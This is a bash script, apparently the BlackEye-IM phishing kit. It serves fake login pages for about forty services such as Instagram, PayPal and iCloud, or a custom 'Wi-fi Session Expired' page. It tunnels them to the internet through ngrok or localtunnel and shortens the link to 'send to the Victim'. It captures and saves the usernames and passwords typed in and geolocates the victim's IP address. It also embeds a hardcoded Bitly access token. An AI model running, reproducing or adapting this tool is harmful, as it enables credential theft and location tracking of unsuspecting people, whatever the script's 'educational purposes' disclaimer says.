#!/bin/bash

# Upgraded by: @Git-Ankitraj (https://github.com/Git-Ankitraj/blackeye-im)
#Enhanced ngrok tunnelling
trap 'printf "\n";stop;exit 1' 2

declare -a socialNetwork=(
	Instagram
	Facebook
	Snapchat
	Twitter
	Github
	Google
	Origin
	Yahoo
	Linkedin
	Protonmail
	Wordpress
	Microsoft
	IGFollowers
	Pinterest
	Apple
	Verizon
	DropBox
	Line
	Shopify
	Messenger
	GitLab
	Twitch
	MySpace
	Badoo
	VK
	Yandex
	devianART
	Wi-Fi
	PayPal
	Steam
	Tiktok
	Playstation
	eBay
	Amazon
	iCloud
	Spotify
	Netflix
	Reddit
	StackOverflow
	Custom
)

stringAppendSpace() {
	local string=$1 length=$2 i

	if [[ ${#string} -lt $length ]]; then
		for ((i=${#string}; i<length; i++)); do
			string="$string "
		done
	fi

	RESULT="$string"
}

stringContains() {
	local string=$1 substr=$2

	[[ "$string" == *"$substr"* ]]
}

numberAppendZero() {
	local number=$1 length=$2 i

	if [[ ${#number} -lt $length ]]; then
		for ((i=${#number}; i<length; i++)); do
			number="0$number"
		done	
	fi

	RESULT="$number"
}

# shellcheck disable=SC2059
menu() {
	local linesPerCol=12 \
	endSym='\e[1;94m' \
	indexPrefix='\e[1;92m[\e[0m\e[1;77m' \
	indexPostfix='\e[0m\e[1;92m]\e[0m\e[1;91m' \
	entryPostfix='\e[0m'\
	entryLength=12 \
	i j entry index indexStr entryStr

	for ((i=0; i<linesPerCol; i++)); do
		entry=""
		for ((j=0; j * linesPerCol + i < ${#socialNetwork[@]}; j++)); do
			index=$((j * linesPerCol + i))
			numberAppendZero $((index+1)) 2
			indexStr=$RESULT
			stringAppendSpace "${socialNetwork[$index]}" $entryLength
			entryStr=$RESULT
			entry+="$indexPrefix$indexStr$indexPostfix $entryStr $entryPostfix"
		done
		printf "          $entry\n"
	done
	printf "$endSym"
	read -rp $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose an option:]─[1~'"${#socialNetwork[@]}"']
 └──╼ ~ ' option

	option=$((option - 1))
	if [[ $option -lt 39 ]]; then
		server=${socialNetwork[$option]}
		server="${server,,}"
		server="${server//-/}"
		start
	elif [[ $option == 39 ]]; then
		server="create"
		createPage
		start
	else
		printf "\e[1;93m [!] Invalid option!\e[0m\n"
		menu
	fi
}

stop() {
	if pgrep ngrok >/dev/null; then
		pkill -f -2 ngrok >/dev/null 2>&1
		killall -2 ngrok >/dev/null 2>&1
	fi
	if pgrep php >/dev/null; then
		pkill -f -2 php >/dev/null 2>&1
		killall -2 php >/dev/null 2>&1
	fi
	if pgrep node >/dev/null; then
		pkill -f -2 node >/dev/null 2>&1
		killall -2 node >/dev/null 2>&1
	fi

}

banner() {
	printf "     \e[101m\e[1;77m:: Disclaimer: Developers assume no liability and are not    ::\e[0m\n"
	printf "     \e[101m\e[1;77m:: responsible for any misuse or damage caused by BlackEye.  ::\e[0m\n"
	printf "     \e[101m\e[1;77m:: Only use for educational purposes!!                      ::\e[0m\n"
	printf "\n"
	printf "     \e[101m\e[1;77m::     BLACKEYE-IM! By @The-Burning                          ::\e[0m\n"
	printf "\n"
}

createPage() {
	local default_cap1 default_cap2 default_user_text default_pass_text default_sub_text textPrefix
	default_cap1="Wi-fi Session Expired"
	default_cap2="Please login again."
	default_user_text="Username:"
	default_pass_text="Password:"
	default_sub_text="Log-In"

	local cap1 cap2 user_text pass_text sub_text

	read -rp $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
	cap1="${cap1:-${default_cap1}}"

	read -rp $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
	cap2="${cap2:-${default_cap2}}"

	read -rp $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
	user_text="${user_text:-${default_user_text}}"

	read -rp $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
	pass_text="${pass_text:-${default_pass_text}}"

	read -rp $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
	sub_text="${sub_text:-${default_sub_text}}"

	cat <<EOF >sites/create/login.html
<!DOCTYPE html>
<html>
<body bgcolor="gray" text="white">
  <center><h2> $cap1 <br><br> $cap2 </h2></center>
	<center>
    <form method="POST" action="login.php"><label>$user_text: </label>
    <input type="text" name="username" length=64>
    <br><label>$pass_text: </label><input type="password" name="password" length=64><br><br>
    <input value="$sub_text" type="submit"></form>
  </center>
<body>
</html>
EOF

}

catchCred() {
	account=$(grep -o 'Account:.*' sites/$server/usernames.txt | cut -d " " -f2)
	IFS=$'\n'
	password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
	cat sites/$server/usernames.txt >>sites/$server/saved.usernames.txt
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
	killall -2 php >/dev/null 2>&1
	killall -2 ngrok >/dev/null 2>&1
	killall -2 node >/dev/null 2>&1
	exit 1
}

getCredentials() {
	echo ' '
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting credentials ...\e[0m\n"
	while :; do
		if [[ -e "sites/$server/usernames.txt" ]]; then
			printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
			catchCred
		fi
		sleep 1
	done
}

catchIp() {
	touch "sites/$server/saved.usernames.txt"
	local ip ua ipInfo ipApi ipv4 cn re ct post loc org tz lat lon
	ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
	ipInfo=$(curl -s https://ipinfo.io/$ip/json)
	ipApi=$(curl -s https://ipapi.co/$ip/json)
	ipv4=$(echo "$ipInfo" | jq -r '.ip')
	cn=$(echo "$ipApi" | jq -r '.country_name')
	re=$(echo "$ipApi" | jq -r '.region')
	ct=$(echo "$ipApi" | jq -r '.city')
	post=$(echo "$ipApi" | jq -r '.postal')
	loc=$(echo "$ipInfo" | jq -r '.loc')
	org=$(echo "$ipInfo" | jq -r '.org')
	tz=$(echo "$ipInfo" | jq -r '.timezone')
	lat=$(echo "$ipApi"/ | jq -r '.latitude')
	lon=$(echo "$ipApi"/ | jq -r '.longitude')

	gm='https://www.google.com/maps/search/?api=1&query='$lat,$lon

	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] IPv6:\e[0m\e[1;77m %s\e[0m\n" "$ip"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" "$ua"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Country:\e[0m\e[1;77m %s\e[0m\n" "$cn"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Region:\e[0m\e[1;77m %s\e[0m\n" "$re"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] City:\e[0m\e[1;77m %s\e[0m\n" "$ct"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Postal:\e[0m\e[1;77m %s\e[0m\n" "$post"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Location:\e[0m\e[1;77m %s\e[0m\n" "$loc"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Maps:\e[0m\e[1;77m %s\e[0m\n" "$gm"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" "$org"
	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Timezone:\e[0m\e[1;77m %s\e[0m\n" "$tz"
	printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" "$server"
	cat "sites/$server/ip.txt" >>"sites/$server/saved.ip.txt"
	getCredentials
}
start() {
	printf "\n"
	printf "1.Ngrok\n"
	printf "2.Local tunnel\n"
	echo ""
	read -rp $'\n\e[1;92m\e[0m\e[1;77m\e[0m\e[1;92m ┌─[ Choose the tunneling method:]─[~]
 └──╼ ~ ' host

	if [[ $host == 1 ]]; then
		sleep 1
		start_ngrok
	elif [[ $host == 2 ]]; then
		sleep 1
		start_localTunnel
	fi
}

start_ngrok() {
	if [[ -e "sites/$server/ip.txt" ]]; then
		rm -rf "sites/$server/ip.txt"
	fi
	if [[ -e "sites/$server/usernames.txt" ]]; then
		rm -rf "sites/$server/usernames.txt"
	fi

	# Download Ngrok if only not installed
	if ! command -v ngrok >/dev/null 2>&1; then
		printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
		local arch arch2 ngrokCdn ngrokArch
		
		arch=$(uname -a | grep -o 'arm' | head -n1)
		arch2=$(uname -a | grep -o 'Android' | head -n1)

		ngrokCdn='https://bin.equinox.io/c/4VmDzA7iaHb/'
		if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
			ngrokArch='arm'
		else
			ngrokArch='386'
		fi

		curl -Lo ngrok.zip "$ngrokCdn/ngrok-stable-linux-$ngrokArch.zip" >/dev/null 2>&1
		if [[ -e ngrok.zip ]]; then
			unzip ngrok.zip >/dev/null 2>&1
			rm -rf ngrok.zip
			chmod +x ngrok
		else
			printf "\e[1;93m[!] Download error... \e[0m\n"
			exit 1
		fi
	fi

	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
	cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 &
	sleep 2
	printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
	./ngrok http 127.0.0.1:5555 >/dev/null 2>&1 &
	sleep 10

	local link AccessToken api short_link
	link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
	printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
	AccessToken=433bdc6028d67bba06cf95286e923cde8c0906c7
	api=https://api-ssl.bitly.com/v4/shorten
	short_link=$(
		curl -s -H Authorization:\ $AccessToken -H Content-Type: -d '{"long_url": "'"$link"\"'}' $api | jq -j .link | xsel -ib
		xsel -ob
	)
	printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" "$short_link"
	echo ""
	echo ""

	checkFound
}
start_localTunnel() {
	if [[ -e "sites/$server/ip.txt" ]]; then
		rm -rf "sites/$server/ip.txt"
	fi
	if [[ -e "sites/$server/usernames.txt" ]]; then
		rm -rf "sites/$server/usernames.txt"

	fi

	printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
	cd "sites/$server" && php -S 127.0.0.1:5555 >/dev/null 2>&1 &
	sleep 2

	printf "\e[1;92m[\e[0m*\e[1;92m] Starting local tunnel server...\n"
	./ngrok http 127.0.0.1:5555 >/dev/null 2>&1 &
	sleep 8
	lt --port 5555 --subdomain "wmw-$server-com" >/dev/null 2>&1 &
	sleep 4
	printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "https://wmw-$server-com.loca.lt"
	short_link=$(curl -Ls "https://tinyurl.com/api-create.php?url=https://wmw-$server-com.loca.lt")
	printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" "$short_link"
	echo ""
	echo ""

	checkFound
}

checkFound() {

	printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
	while :; do
		if [[ -e "sites/$server/ip.txt" ]]; then
			printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
			catchIp
		fi
		sleep 1
	done

}

rm -rf setup.sh
rm -rf tmxsp.sh
rm -rf index.html
rm -rf .gitignore
rm -rf .nojekyll
banner
menu
